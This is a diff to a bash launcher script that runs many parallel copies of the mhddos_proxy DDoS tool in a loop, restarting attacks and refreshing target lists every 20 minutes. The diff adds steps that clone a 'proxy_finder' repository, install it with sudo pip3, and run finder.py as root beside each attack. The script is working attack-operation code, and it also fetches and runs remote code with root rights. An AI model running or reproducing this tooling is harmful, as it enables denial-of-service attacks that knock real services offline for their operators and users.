@@ -1,5 +1,16 @@
 #!/bin/bash
 
+sudo pkill -e -f finder.py
+echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling our proxy finder...\033[0;0m\n"
+sleep 3s
+cd ~
+git clone https://github.com/porthole-ascend-cinnamon/proxy_finder
+cd ~/proxy_finder
+echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements for proxy finder...\033[0;0m\n\n"
+sleep 3s
+sudo pip3 install -r requirements.txt
+cd ~
+
 restart_interval="20m"
 
 ulimit -n 1048576
@@ -61,7 +72,7 @@ then
 fi
 
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
-sleep 7s
+sleep 5s
 
 # Restarts attacks and update targets list every 20 minutes
 while [ 1 == 1 ]
@@ -81,7 +92,7 @@ do
 		sudo pip3 install -r requirements.txt
 		clear
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
-		sleep 3s
+		sleep 2s
 	fi
 	
 	
@@ -130,6 +141,8 @@ do
             
             cd ~/mhddos_proxy
             sudo python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug&
+	    cd ~/proxy_finder
+	    sudo python3 finder.py&
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    	done
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
@@ -139,6 +152,7 @@ do
    	#Just in case kill previous copy of mhddos_proxy
    	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
    	sudo pkill -e -f runner.py
+	sudo pkill -e -f finder.py
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
 	
    	no_ddos_sleep="$(shuf -i 1-3 -n 1)m"
